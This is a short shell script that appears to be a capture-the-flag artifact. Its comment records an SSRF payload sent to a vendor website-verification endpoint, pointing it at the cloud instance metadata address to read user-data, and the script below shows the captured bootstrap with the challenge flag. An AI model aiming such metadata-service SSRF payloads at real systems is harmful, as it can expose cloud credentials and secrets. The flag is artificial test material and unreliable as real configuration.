#!/bin/sh
# Captured via SSRF on `POST /api/vendor/verify-website`:
#   {"website":"http://169.254.169.254/latest/user-data"}
# Host:        134.209.117.21
# Captured:    2026-06-21
#
# This is the bootstrap shell script the mocked AWS IMDSv1 serves as
# `latest/user-data`. The TRUSTING_VERIFIER_FLAG env var is the literal
# challenge name (and the flag).
export MARKETPLACE_ENV=ctf
export TRUSTING_VERIFIER_FLAG=bitflag{ssrf_1s_4_p4rty_cr4sh3r}
node server.js
